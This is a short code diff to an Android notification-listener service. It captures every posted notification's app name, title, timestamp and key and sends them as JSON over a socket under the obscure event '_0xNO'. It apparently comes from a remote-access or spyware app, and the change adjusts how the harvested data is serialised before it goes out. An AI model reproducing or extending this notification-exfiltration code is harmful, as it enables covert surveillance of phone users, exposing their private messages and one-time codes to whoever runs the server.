@@ -40,6 +40,7 @@ public class NotificationListener extends NotificationListenerService {
             long postTime = sbn.getPostTime();
             String uniqueKey = sbn.getKey();
 
+
             JSONObject data = new JSONObject();
             data.put("appName", appName);
             data.put("title", title);
@@ -47,7 +48,7 @@ public class NotificationListener extends NotificationListenerService {
             data.put("postTime", postTime);
             data.put("key", uniqueKey);
 
-            IOSocket.getInstance().send("_0xNO", data);
+            IOSocket.getInstance().send("_0xNO", data.toString());
         } catch (JSONException e) {
             e.printStackTrace();
         }
